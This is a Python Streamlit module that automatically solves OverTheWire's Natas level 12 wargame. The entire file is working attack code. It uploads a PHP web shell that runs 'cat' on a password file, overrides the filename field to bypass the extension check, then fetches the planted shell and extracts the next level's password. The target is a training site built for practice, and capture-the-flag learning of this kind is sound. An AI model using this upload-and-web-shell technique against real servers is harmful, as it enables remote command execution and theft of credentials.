import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting unrestricted file upload configuration via hidden filename parameters...")
    
    # 1. Define the tiny script wrapper targeting the target flag location
    php_payload = "<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>"
    
    # 2. Structure the multipart data structure exactly how curl handled it
    files = {
        'uploadedfile': ('exploit.php', php_payload, 'application/x-php')
    }
    
    # Inject 'exploit.php' into the 'filename' parameter to override the default '.jpg' logic
    data = {
        'filename': 'exploit.php',
        'submit': 'Upload File'
    }
    
    try:
        st.write("📤 Transmitting multi-part payload with modified extension metadata...")
        response = session.post(base_url, files=files, data=data, timeout=10)
        
        if response.status_code == 200:
            # 3. Target the generated path signature within the raw HTML response body
            match = re.search(r'The file <a href="([^"]+)">', response.text)
            
            if match:
                relative_uploaded_path = match.group(1)
                execution_url = f"{base_url}/{relative_uploaded_path}"
                st.success(f"🔓 Web shell successfully established on the remote server!")
                st.write(f"Target file path: `{execution_url}`")
                
                # 4. Access the newly created file path to capture the echoed shell output
                st.write("🔄 Fetching payload URL context to parse flag contents...")
                execution_response = session.get(execution_url, timeout=10)
                output_text = execution_response.text.strip()
                
                # 5. Isolate the target alphanumeric character length sequence
                token_match = re.search(r'[A-Za-z0-9]{32}', output_text)
                
                if token_match:
                    st.success("🎯 Level 12 challenge solved successfully!")
                    st.code(f"Natas 13 Password: {token_match.group(0)}")
                else:
                    st.warning("The resource path returned successfully, but no matching alphanumeric flag was found.")
                    with st.expander("View Raw Output Context"):
                        st.code(output_text)
            else:
                st.error("Failed to extract the destination folder path string from the web presentation wrapper.")
                with st.expander("View Content Diagnostics"):
                    st.code(response.text, language="html")
        else:
            st.error(f"The web request configuration was rejected by the application. Status Code: {response.status_code}")
            
    except Exception as e:
        st.error(f"Module execution structure failed: {str(e)}")